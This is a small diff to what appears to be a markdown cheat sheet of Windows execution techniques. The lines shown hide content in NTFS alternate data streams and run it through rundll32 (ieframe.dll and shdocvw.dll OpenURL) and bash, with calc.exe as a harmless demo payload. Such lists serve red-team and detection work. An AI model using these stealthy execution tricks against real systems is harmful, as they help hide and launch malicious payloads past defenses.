@@ -4,7 +4,7 @@
 `echo [internetshortcut] > fake.txt:test.txt && echo url=C:\windows\system32\calc.exe  >> fake.txt:test.txt`
 `rundll32.exe ieframe.dll,OpenURL C:\temp\ads\fake.txt:test.txt` <br>
 `rundll32.exe shdocvw.dll,OpenURL C:\temp\ads\fake.txt:test.txt`
-* bash.exe (ads)
+* bash.exe (ads) <br>
 `echo calc > fakefile.txt:payload.sh && bash < fakefile.txt:payload.sh` <br>
 `bash.exe -c $(fakefile.txt:payload.sh)` <br>
 
